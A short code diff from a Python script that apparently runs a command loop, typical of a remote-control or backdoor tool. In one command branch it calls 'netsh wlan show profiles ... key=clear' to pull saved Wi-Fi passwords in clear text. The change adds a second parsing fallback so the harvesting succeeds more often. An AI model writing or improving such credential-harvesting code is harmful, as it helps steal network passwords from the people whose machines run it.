@@ -58,7 +58,10 @@ while True:
                 password = subprocess.getoutput('netsh wlan show profiles "{}" key=clear'.format(i)).split('Security settings')[1].split('Cost settings')[0].split('Key Content            : ')[1].split('\n')[0]
                 wifi_info[i] = password
             except IndexError:
-                wifi_info[i] = 'N/A'
+                try:
+                    wifi_info[i] = subprocess.getoutput('netsh wlan show profiles "{}" key=clear'.format(i)).split('Profile')[3].split('Key Content')[1].split(': ')[1].split('\n')[0]
+                except IndexError:
+                    wifi_info[i] = 'N/A'
         final_info = [i + ': ' + wifi_info[i] for i in wifi_info]
         out = '\n'.join(final_info) + '\n'
     elif cmd.lower() == 'time': 
